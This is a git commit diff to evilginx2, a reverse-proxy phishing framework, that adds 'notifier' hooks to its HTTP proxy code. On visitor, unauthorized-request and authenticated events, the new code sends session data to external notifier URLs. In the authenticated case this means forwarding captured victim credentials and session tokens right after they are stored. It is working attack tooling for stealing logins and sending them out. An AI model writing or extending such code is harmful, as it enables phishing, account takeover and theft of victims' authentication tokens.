108ed2adfb4bffab7aaf593f00923ff89a12ef84
Steve Nelson <80222096+stevesec@users.noreply.github.com>
2023-02-14 10:37:07 -0500

    Adding Notifiers per issue-865029661

--- evilginx2/core/http_proxy.go
+++ evilginx2/core/http_proxy.go
@@ -171,8 +171,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             // Handle clicked link and email opened events
             rid := ""
             browser := map[string]string{}
-            ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
-            trackr, _ := regexp.Compile(`track\?client_id=`)
+            ridr, _ := regexp.Compile(`id=([^\"]*)`)
+            trackr, _ := regexp.Compile(`track\?id=`)
             rid_match := ridr.FindString(req_url)
             opened_match := trackr.FindString(req_url)
             //log.Debug("Track regex", trackr.FindString(req_url))
@@ -288,6 +288,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     //p.whitelistIP(remote_addr, ps.SessionId)
 
                                     req_ok = true
+				    for _, n := range p.cfg.notifiers {
+					if n.OnEvent == "visitor" && n.Enabled {
+						session, _ := p.db.GetSessionBySid(session.Id)
+						log.Info("[%d] [%s] forwarding visitor info to notifier url %s", sid, hiblue.Sprint(pl_name), n.Url)
+						err := NotifyOnVisitor(n, *session, req.URL)
+						if err != nil {
+							log.Error("notifier: %v", err)
+						}
+					}
+				}
                                 }
                             } else {
                                 log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -300,6 +310,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                         log.Warning("blacklisted ip address: %s", from_ip)
                                     }
                                 }
+
+				for _, n := range p.cfg.notifiers {
+					if n.OnEvent == "unauthorized" && n.Enabled {
+						log.Info("[%s] forwarding unauthorized request to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+						err := NotifyOnUnauthorized(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+						if err != nil {
+							log.Error("notifier: %v", err)
+						}
+					}
+				}
                                 return p.blockRequest(req)
                             }
                         } else {
@@ -747,7 +767,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
                                         log.Error("database: %v", err)
                                     }
-                                    s.IsDone = true
+                                    for _, n := range p.cfg.notifiers {
+					if n.OnEvent == "authenticated" && n.Enabled {
+						session, _ := p.db.GetSessionBySid(ps.SessionId)
+						log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+						err := NotifyOnAuth(n, *session, pl)
+						if err != nil {
+							log.Error("notifier: %v", err)
+						}
+					}
+				}
+				s.IsDone = true
                                 }
                             }
                         }
